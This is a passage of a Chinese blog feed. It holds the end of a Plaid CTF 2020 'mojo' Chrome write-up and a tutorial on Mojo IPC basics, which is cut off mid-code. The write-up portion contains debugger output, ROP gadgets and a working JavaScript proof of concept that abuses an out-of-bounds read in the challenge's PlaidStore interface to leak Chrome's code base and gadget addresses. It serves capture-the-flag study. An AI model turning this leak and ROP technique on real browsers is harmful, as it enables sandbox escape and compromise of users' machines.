analyze/Plaid-CTF-2020-mojo/mojo/chrome</span><br><span class="line">►   0x55555f455000     0x55555faf2000 r--p   69d000 9eff000 /media/lanan/76286875BA4E14EF/Browser-pwn/Vulnerability analyze/Plaid-CTF-2020-mojo/mojo/chrome +0xb57a0</span><br><span class="line">    0x55555faf2000     0x55555fb4e000 rw-p    5c000 a59b000 /media/lanan/76286875BA4E14EF/Browser-pwn/Vulnerability analyze/Plaid-CTF-2020-mojo/mojo/chrome</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x191d2c28a000     0x191d2c28b000 ---p     1000      0 [anon_191d2c28a]</span><br><span class="line">    0x191d2c28b000     0x191d2c68a000 rw-p   3ff000      0 [anon_191d2c28b]</span><br><span class="line">    0x555555554000     0x55555824b000 r--p  2cf7000      0 /media/lanan/76286875BA4E14EF/Browser-pwn/Vulnerability analyze/Plaid-CTF-2020-mojo/mojo/chrome</span><br><span class="line">pwndbg&gt; p/x 0x000055555f50a7a0-0x555555554000</span><br><span class="line">$3 = 0x9fb67a0</span><br></pre></td></tr></table></figure><p>有了这个之后我们需要寻找gadget，这里我们使用Ropgadget来寻找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary=./chrome &gt; gadget.txt</span><br><span class="line">---</span><br><span class="line">//0x000000000880dee8 : xchg rsp, rax ; clc ; pop rbp ; ret</span><br><span class="line">//0x0000000002e4630f : pop rdi ; ret</span><br><span class="line">//0x0000000002d278d2 : pop rsi ; ret</span><br><span class="line">//0x0000000002e9998e : pop rdx ; ret</span><br><span class="line">//0x0000000002e651dd : pop rax ; ret</span><br><span class="line">//0x0000000002ef528d : syscall</span><br></pre></td></tr></table></figure><p>之后我们就可以写出来泄露地址的poc了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用MojoJs接口时一定要把这些js包含在html中--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;mojo_js/mojo/public/js/mojo_bindings.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">dec2hex</span>(<span class="params">dec</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + dec.<span class="title function_">toString</span>(<span class="number">16</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">bytes2WORD</span>(<span class="params">bytes</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> value = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">            value = value * <span class="number">0x100</span> + bytes[<span class="number">7</span> - i];</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> value;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">sucess</span>(<span class="params">message</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] &#x27;</span> + message);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//OOB</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">oob</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;OOB test&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ps_list = [];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> try_size = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> vt_addr = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> render_frame_host_addr = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> code_base = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> pipe = <span class="title class_">Mojo</span>.<span class="title function_">createMessagePipe</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//使PlaidStore与接口绑定</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Mojo</span>.<span class="title function_">bindInterface</span>(</span></span><br><span class="line"><span class="language-javascript">                blink.<span class="property">mojom</span>.<span class="property">PlaidStore</span>.<span class="property">name</span>,</span></span><br><span class="line"><span class="language-javascript">                pipe.<span class="property">handle1</span>, <span class="string">&quot;context&quot;</span>, <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">            );</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> plaidstorePtr = <span class="keyword">new</span> blink.<span class="property">mojom</span>.<span class="title class_">PlaidStorePtr</span>(pipe.<span class="property">handle0</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">await</span> plaidstorePtr.<span class="title function_">storeData</span>(<span class="string">&quot;aaaa&quot;</span>,<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x30</span>).<span class="title function_">fill</span>(<span class="number">0x31</span>)); <span class="comment">// key =&gt; &lt;vector&gt;data</span></span></span><br><span class="line"><span class="language-javascript">            ps_list.<span class="title function_">push</span>(plaidstorePtr);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(vt_addr != <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> tmp_ps_ptr = ps_list[i];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> r = <span class="keyword">await</span> tmp_ps_ptr.<span class="title function_">getData</span>(<span class="string">&quot;aaaa&quot;</span>,<span class="number">0x100</span>); <span class="comment">// 这里是为了防止读到稀奇古怪的地址</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> oob_data = r.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0x30</span>; i&lt; <span class="number">0x100</span>; i++)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> tmp_oob_data = <span class="title function_">bytes2WORD</span>(oob_data.<span class="title function_">slice</span>(i,i+<span class="number">8</span>));</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(<span class="title function_">dec2hex</span>(tmp_oob_data &amp; <span class="number">0xfff</span>) == <span class="string">&quot;0x7a0&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    vt_addr = tmp_oob_data;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;vt_addr &quot;</span> + <span class="title function_">dec2hex</span>(vt_addr));</span></span><br><span class="line"><span class="language-javascript">                    code_base = vt_addr - <span class="number">0x9fb67a0</span>;</span></span><br><span class="line"><span class="language-javascript">                    render_frame_host_addr = <span class="title function_">bytes2WORD</span>(oob_data.<span class="title function_">slice</span>(i+<span class="number">8</span>, i+<span class="number">16</span>));</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(vt_addr != <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(vt_addr == <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">throw</span>(<span class="string">&quot;Error!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> chrome_text_addr = code_base;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;chrome_test_addr = &quot;</span>, <span class="title function_">dec2hex</span>(chrome_text_addr));</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> pop_rbp_ret = chrome_text_addr + <span class="number">0x880dee8</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pop_rbp_ret = &quot;</span>, <span class="title function_">dec2hex</span>(pop_rbp_ret));</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> pop_rdi_ret = chrome_text_addr + <span class="number">0x2e4630f</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pop_rdi_ret = &quot;</span>, <span class="title function_">dec2hex</span>(pop_rdi_ret));</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> pop_rsi_ret = chrome_text_addr + <span class="number">0x2d278d2</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pop_rsi_ret = &quot;</span>, <span class="title function_">dec2hex</span>(pop_rsi_ret));</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> pop_rdx_ret = chrome_text_addr + <span class="number">0x2e9998e</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pop_rdx_ret = &quot;</span>, <span class="title function_">dec2hex</span>(pop_rdx_ret));</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> pop_rax_ret = chrome_text_addr + <span class="number">0x2e651dd</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pop_rax_ret = &quot;</span>, <span class="title function_">dec2hex</span>(pop_rax_ret));</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> syscall = chrome_text_addr + <span class="number">0x2ef528d</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;syscall = &quot;</span>, <span class="title function_">dec2hex</span>(syscall));</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">oob</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>泄露出来地址如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;vt_addr 0x557fa91177a0&quot;</span><br><span class="line">&quot;chrome_test_addr =  0x557f9f161000&quot; </span><br><span class="line">&quot;pop_rbp_ret =  0x557fa796eee8&quot; </span><br><span class="line">&quot;pop_rdi_ret =  0x557fa1fa730f&quot; </span><br><span class="line">&quot;pop_rsi_ret =  0x557fa1e888d2&quot; </span><br><span class="line">&quot;pop_rdx_ret =  0x557fa1ffa98e&quot; </span><br><span class="line">&quot;pop_rax_ret =  0x557fa1fc61dd&quot; </span><br><span class="line">&quot;syscall     =  0x557fa205628d&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;mojo&quot;&gt;&lt;a href=&quot;#mojo&quot; class=&quot;headerlink&quot; title=&quot;mojo&quot;&gt;&lt;/a&gt;mojo&lt;/h2&gt;&lt;h2 id=&quot;mojo术语&quot;&gt;&lt;a href=&quot;#mojo术语&quot; class=&quot;headerlink&quot; title=&quot;mojo术语&quot;&gt;&lt;/a&gt;mojo术语&lt;/h2&gt;&lt;p&gt;message pipe是一对endpoints，对应通信的两端，每个endpoint保存一个传入消息队列，并且在一端写入消息可以有效地传送到另外一端，因此message pipe是双向的。&lt;br&gt;一个mojom文件描述一组interfaces，其代表的是强类型的消息集合。&lt;br&gt;给定一个mojom接口和一条message pipe，可以将其中指定为Remote，用来发送该接口描述的信息，另一端指定为Recevier，用来接收接口的消息。&lt;br&gt;Receiver端必须和mojom接口的具体实现(implementation)相绑定，从而将收到的消息分发给对应的接口实现函数。&lt;/p&gt;</summary>
    
    
    
    <category term="chrome" scheme="http://example.com/categories/chrome/"/>
    
    
    <category term="chrome" scheme="http://example.com/tags/chrome/"/>
    
    <category term="mojo" scheme="http://example.com/tags/mojo/"/>
    
  </entry>
  
  <entry>
    <title>mojo-基础知识</title>
    <link href="http://example.com/2023/10/20/mojo-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://example.com/2023/10/20/mojo-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
    <published>2023-10-20T11:50:39.000Z</published>
    <updated>2025-02-02T08:54:42.319Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mojo"><a href="#Mojo" class="headerlink" title="Mojo"></a>Mojo</h1><p>Mojo是一个跨平台的IPC框架，诞生于chromium，用来实现chromium进程内或进程间通信。目前也被用于Chromeos。</p><span id="more"></span><h2 id="Mojo的分层"><a href="#Mojo的分层" class="headerlink" title="Mojo的分层"></a>Mojo的分层</h2><img src="/2023/10/20/mojo-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/mojo_stack.png" class="" title="mojo-stack"><p>从图中看Mojo分为4层：</p><ol><li><strong>Mojo Core</strong>:Mojo的实现层，不能独立使用，由** C++ **实现；</li><li><strong>Mojo System API(C)</strong>:Mojo的C API层，它和Mojo Core对接，可以在程序中独立使用；</li><li><strong>Mojo System API(C++&#x2F;Java&#x2F;JS)</strong>: Mojo的各种语言包装层，它将Mojo C API包装成多种语言的库，让其他语言可以使用。这一层也可以在程序中独立使用。</li><li><strong>Mojo Bindings</strong>: 这一层引入一种称为Mojom的idl(接口定义)语言，通过它可以定义通信接口，这些接口生成接口类，使用户只要实现这些接口就可以和Mojo进行通信，这一层使得IPC两端不需要通过原始字节流进行通信，而是通过接口进行通信，有些类似于Protobuf和Thrift。</li></ol><p>除了上述提到的那些层之外，在Chromium中还有两个模块对Mojo进行了包装，分别是Services(&#x2F;&#x2F;services)模块和IPC(&#x2F;&#x2F;ipc)模块。</p><ol><li><strong>services</strong>：一种更高层次的IPC机制，构建于Mojo之上，以service的级别来进行IPC通信，Chromium大量使用这种IPC机制来包装各种服务，用来取代Leagcy Chrome IPC，比如device服务，preferences服务，audio服务，viz服务。</li><li><strong>Leagcy Chrome IPC</strong>：已经不推荐使用的Chrome IPC机制，提供IPC::Channer接口以及大量的宏来定义messages类，目前底层也是基于Mojo来实现的，但是上层接口和旧的Chrome IPC保持一致。Chromium中还有很多IPC来使用这种方式，但是不应该在新的服务中使用这种机制。可以在<a href="https://source.chromium.org/chromium/chromium/src/+/main:ipc/ipc_message_start.h;bpv=0;bpt=0">ipc&#x2F;ipc_message_start.h</a>中来查看还有哪些服务使用了这种机制。</li></ol><h3 id="Mojo在Chromium中的分层"><a href="#Mojo在Chromium中的分层" class="headerlink" title="Mojo在Chromium中的分层"></a>Mojo在Chromium中的分层</h3><img src="/2023/10/20/mojo-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/chromium-mojo-layer.png" class="" title="chromium-mojo-layer"><p>在Chromium中，还有两个基础模块使用Mojo，分别是Services和IPC::Channel。</p><h2 id="Mojo的设计"><a href="#Mojo的设计" class="headerlink" title="Mojo的设计"></a>Mojo的设计</h2><p>在使用Mojo之前，我们来看一下Mojo的设计，这对理解后面的使用至关重要。</p><p>Mojo支持在多个进程之间相互通信，这一点和其他的IPC有很大不同, 其他大多只支持两个进程之间进行通信。由Mojo组成的这些可以互相通信的进程就形成了一个网络，在这个网络内的任意两个进程都可以进行通信，并且每个进程只能处于一个mojo网络中，在这个网络内每一个进程内部有且只有一个Node，每一个Node都可以提供多个Port，每个Port都对应一种服务，这点类似于TCP&#x2F;IP中的IP地址和端口的关系。一个<code>Node:Port</code>对可以唯一确定一个服务。Node和Node之间通过Channel来实现通信，在不同平台上channel有不同的实现方式，在Linux上是domain socket，在windows上是name pipe，在MAC os上是Mach Port。在Port上一层，Mojo封装了三个“应用层协议”，分别为<code>MessagePipe</code>,<code>DataPipe</code>和<code>SharedBuffer</code>(类似于在TCP上封装了HTTP,SMTP)。整体结构如下图</p><img src="/2023/10/20/mojo-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/mojo_dis.png" class="" title="mojo_dis"><p>上图展示了在两个进程之间使用Mojo的数据流。它有以下几个特点:</p><ol><li><strong>Channel</strong>: Mojo内部的实现细节，对外不可见，用于包装系统底层的通信通道，在Linux下是domain socket，Windows下是name pipe，在Mac os下是mach port。</li><li><strong>Node</strong>: 每个进程都只有一个Node，它在Mojo中的作用相当于TCP&#x2F;IP中的IP地址，同样是内部实现细节，对外不可见。</li><li><strong>Port</strong>: 每个进程可以有成千上百个Port，它在Mojo中的作用相当于TCP&#x2F;IP的端口，每个Port都会对应一种应用层接口，目前Mojo支持三种应用层接口。</li><li><strong>MessagePipe</strong>: 应用层接口，用于进程间的双向通信，类似于UDP，消息是基于数据包的，底层使用Channel通道。</li><li><strong>DataPipe</strong>: 应用层接口，用于进程间单向块数据传递，类似TCP，消息是基于数据流的，底层使用系统的Shared Memory实现</li><li><strong>SharedBuffer</strong>: 应用层接口，支持双向块数据传递，底层使用系统Shared Memory实现；</li><li><strong>MojoHandle</strong>： 所有的 MessagePipe,DataPipe,SharedBuffer 都使用MojoHandle来包装，有了这个Handle就可以对它们进行读写操作。还可以通过MessagePipe将MojoHandle发送到网络中的任意进程。</li><li><strong>PlatformHandle</strong>: 用来包装系统的句柄或文件描述符，可以将它转换为MojoHandle然后发送到网络中的任意进程。</li></ol><h3 id="MessagePipe"><a href="#MessagePipe" class="headerlink" title="MessagePipe"></a>MessagePipe</h3><p>一个进程中可以有N多个MessagePipe，所有的都共享底层的一条通信通道，就像下图这样</p><img src="/2023/10/20/mojo-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/MessagePipe.png" class="" title="MessagePipe"><p>Mojo保证同一个MessagePipe中的数据发送和接收顺序一致，但是不保证多个MessagePipe之间的数据的有序</p><h2 id="Mojo的应用"><a href="#Mojo的应用" class="headerlink" title="Mojo的应用"></a>Mojo的应用</h2><p>Mojo不仅可以在Chromium中使用，也可以在任何第三方程序中使用，因为其本身不依赖于Chromium中的业务逻辑部分。不过由于其源码在Chromium中，使用起来可能不是那么方便。</p><p>Mojo提供了不同层次的API，外部可以根据自己的需要选择使用的层次，下面我们简单介绍每种API的使用方法</p><h3 id="初始化Mojo"><a href="#初始化Mojo" class="headerlink" title="初始化Mojo"></a>初始化Mojo</h3><p>初始化Mojo有两种方式，一种适用于静态链接的Mojo程序，一种适用于动态链接Mojo的程序。一下是静态链接时的初始化方法，动态链接时只需要把<code>mojo:::core::Init()</code>替换为<code>MojoInitialize()</code>即可</p><p>初始化接口头文件为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mojo/core/embedder/embedder.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mojo/core/embedder/scoped_ipc_support.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>初始化方法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">    <span class="comment">//初始化commandLine，DataPipe依赖它</span></span><br><span class="line">    base::commandLine::Init(argc, argv);</span><br><span class="line">    <span class="comment">//初始化mojo</span></span><br><span class="line">    mojo::core::Init();</span><br><span class="line">    <span class="comment">//创建一个线程，用于Mojo内部收发数据</span></span><br><span class="line">    base::Thread <span class="title function_">ipc_thread</span><span class="params">(<span class="string">&quot;ipc!&quot;</span>)</span>;</span><br><span class="line">    ipc_thread.StartWithOptions(</span><br><span class="line">        base::Thread::Options(base::MessageLoop::TYPE_IO, <span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始化Mojo的IPC支持，只有初始化后进程间的mojo通信才能有效</span></span><br><span class="line">    <span class="comment">//这个对象要保证一直存活，否则IPC通信就会断开</span></span><br><span class="line">    mojo::core::ScopedIPCSupport <span class="title function_">ipc_support</span><span class="params">(</span></span><br><span class="line"><span class="params">        ipc_thread.task_runner(),</span></span><br><span class="line"><span class="params">        mojo::core::ScopedIPCSupport::ShutdownPolicy::CLEAN)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    ..</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Mojo-c-API"><a href="#Mojo-c-API" class="headerlink" title="Mojo c API"></a>Mojo c API</h3><p>Mojo C API都比较简单，主要的头文件位于:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SharedBuffer API</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mojo/public/c/system/buffer.h&quot;</span></span></span><br><span class="line"><span class="comment">// DataPipe API</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mojo/public/c/system/data_pipe.h&quot;</span></span></span><br><span class="line"><span class="comment">// MessagePipe API</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mojo/public/c/system/message_pipe.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>下面是在单进程中使用MessagePipe发送和接收数据的方法；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用C接口创建一条MessagePipe</span></span><br><span class="line"><span class="comment">//MessagePipe只是一对数字，只用于ID标识，并不对应任何系统资源</span></span><br><span class="line"><span class="comment">//因此可以非常快速不可能失败的创建大量messagepipe</span></span><br><span class="line"></span><br><span class="line">MojoHandle sender_handle, receiver_handle;</span><br><span class="line">MojoResult result = </span><br><span class="line">    MojoCreateMessagePipe(<span class="literal">NULL</span>, &amp;sender_handle, &amp;receiver_handle);</span><br><span class="line">DCHEK_EQ(result, MOJO_RESULT_OK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用C接口发送一条消息</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//创建一条message</span></span><br><span class="line">    MojoMessageHandle message;</span><br><span class="line">    result = MojoCreateMessage(nullptr, &amp;message);</span><br><span class="line">    DCHEK_EQ(result, MOJO_RESULT_OK);</span><br><span class="line">    MojoAppendMessageDataOptions options;</span><br><span class="line">    options.struct_size = <span class="keyword">sizeof</span>(options);</span><br><span class="line">    <span class="comment">//这个选项表示这条消息完整了，底层可以发送了</span></span><br><span class="line">    options.flags = MOJO_APPEND_MESSAGE_DATA_FLAG_COMMIT_SIZE;</span><br><span class="line">    <span class="type">void</span>* buffer;</span><br><span class="line">    <span class="type">uint32_t</span> buffer_size;</span><br><span class="line">    <span class="comment">// 给message填充数据</span></span><br><span class="line">    result = MojoAppendMessageData(message, <span class="number">6</span>, nullptr, <span class="number">0</span>, &amp;options, &amp;buffer, &amp;buffer_size);</span><br><span class="line">    DCHECK_EQ(result, MOJO_RESULT_OK);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer, <span class="string">&quot;hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">&quot;send: &quot;</span>&lt;&lt; (<span class="type">const</span> <span class="type">char</span>*)buffer;</span><br><span class="line">    <span class="comment">//发送message</span></span><br><span class="line">    result = MojoWriteMessage(sender_handle, message, nullptr);</span><br><span class="line">    DCHECK_EQ(result, MOJO_RESULT_OK);</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    MojoMessageHandle message;</span><br><span class="line">    MojoResult result = MojoReadMessage(receiver_handle, nullptr, &amp;message);</span><br><span class="line">    DCHECK_EQ(result, MOJO_RESULT_OK);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* buffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">uint32_t</span> num_bytes;</span><br><span class="line">    result = MojoGetMessageData(message, nullptr, &amp;buffer, &amp;num_bytes, nullptr, nullptr);</span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">&quot;receive: &quot;</span> &lt;&lt; (<span class="type">const</span> <span class="type">char</span>*)buffer;</span><br><span 